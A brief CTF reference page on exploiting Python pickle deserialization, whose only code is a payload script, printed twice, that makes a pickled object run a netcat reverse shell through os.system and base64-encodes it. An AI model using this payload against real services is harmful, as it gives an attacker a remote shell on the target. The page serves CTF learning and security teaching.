---
title: "Pickle"
description: "Exploit Python's insecure object deserialization through the pickle module for remote code execution."
date: 2025-10-06
draft: false
weight: 20
categories: ["Web"]
tags: ["pickle", "python", "rce", "serialization", "ctf"]
authors: ["CTF.Support Team"]
summary: "Understand how Python pickle deserialization can lead to arbitrary code execution when loading untrusted data."
aliases: ["/web/python/pickle/"]
slug: "pickle"
toc: true
---

## Introduction

The Python `pickle` module serializes and deserializes objects.  
When loading user-supplied pickle data, arbitrary code execution can occur.

## Example Payload

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Python's [pickle](https://docs.python.org/3/library/pickle.html) module is used to serialize and deserialize Python objects.

## RCE

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Source: [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
